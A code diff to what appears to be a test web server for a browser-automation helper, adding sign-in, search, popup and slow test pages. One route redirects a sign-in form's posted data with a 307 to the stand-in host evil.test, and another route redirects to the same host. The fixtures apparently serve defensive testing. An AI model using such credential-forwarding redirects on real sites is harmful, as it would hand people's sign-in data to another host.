@@ -81,12 +81,62 @@ def _udp_canary(log: Log) -> socket.socket:
     return u
 
 
-def _redirect(to: str):
+def _redirect(to: str, code: int = 302):
     def go(h):
-        h.send_response(302)
+        h.send_response(code)
         h.send_header("Location", to)
         h.send_header("Content-Length", "0")
         h.end_headers()
+
+    return go
+
+
+# Take over (ORCH-1495): a sign-in page with fixed field places (picture pixels = page pixels at 1280 x 800); what
+# the page heard of keys and buttons is written into the page for the helper's look.
+SIGNIN = """<html><head><title>Sign in</title><style>body{margin:0;font:16px sans-serif}
+input,button{position:absolute;left:100px;width:300px;height:40px}</style></head><body>
+<input id="u" aria-label="Name" style="top:100px">
+<input id="p" type="password" aria-label="Secret" style="top:200px">
+<form method="post" action="/post"><button id="send" style="top:300px">Send</button></form>
+<p id="heard" style="position:absolute;top:400px;left:100px">heard:</p>
+<script>
+const say = s => { document.getElementById('heard').textContent += ' ' + s; };
+document.addEventListener('keydown', e => { if (e.key.length > 1) say('down-' + e.key); });
+document.addEventListener('keyup', e => { if (e.key.length > 1) say('up-' + e.key); });
+document.addEventListener('mousedown', () => say('mousedown'));
+document.addEventListener('mouseup', () => say('mouseup'));
+</script></body></html>"""
+
+
+# A GET search form whose result echoes the words into the title and the text, a note field that puts what is typed
+# into its own address in place (history.pushState), and a button that opens a popup carrying the words (ORCH-1495:
+# nothing a person typed reaches the helper).
+def SEARCH(h):
+    from html import escape
+    from urllib.parse import parse_qs, urlsplit
+
+    q = escape((parse_qs(urlsplit(h.path).query).get("q") or [""])[0])
+    return f"""<html><head><title>Results for {q}</title><style>body{{margin:0;font:16px sans-serif}}
+input,button{{position:absolute;left:100px;width:300px;height:40px}}</style></head><body>
+<form method="get" action="/search"><input name="q" aria-label="Search words" style="top:100px"></form>
+<input id="n" aria-label="Note" style="top:200px"
+ oninput="history.pushState(null, '', '/search?note=' + encodeURIComponent(this.value))">
+<button id="pop" style="top:300px"
+ onclick="window.open('/search?q=' + encodeURIComponent(document.getElementById('n').value))">Open</button>
+<p style="position:absolute;top:400px;left:100px">You looked for {q}</p></body></html>"""
+
+
+def _slow(secs: float):
+    def go(h):
+        import time
+
+        time.sleep(secs)
+        data = b"<html><head><title>Slow page</title></head><body><h1>Slow page</h1></body></html>"
+        h.send_response(200)
+        h.send_header("Content-Type", "text/html; charset=utf-8")
+        h.send_header("Content-Length", str(len(data)))
+        h.end_headers()
+        h.wfile.write(data)
 
     return go
 
@@ -145,7 +195,17 @@ setTimeout(() => {{ const w = new Worker(URL.createObjectURL(new Blob(
                 "/hostile": hostile,
                 "/redir": _redirect("http://evil.test/redirected"),
                 "/post": "posted",
+                # take over (owner pick A): a sign-in whose send the site hands on, data and all, to another host
+                "/signin307": SIGNIN.replace('action="/post"', 'action="/post307"'),
+                "/post307": _redirect("http://evil.test/post", 307),
+                "/opener": "<html><head><title>Opener</title></head><body><h1>Opener</h1>"
+                "<script>setTimeout(() => { alert('Hello from the page'); window.open('/'); }, 300)</script>"
+                "</body></html>",
                 "/beacon": "beacon",
+                "/signin": SIGNIN,
+                "/search": SEARCH,
+                "/slow": _slow(3),
+                "/slower": _slow(12),
             },
         )
 
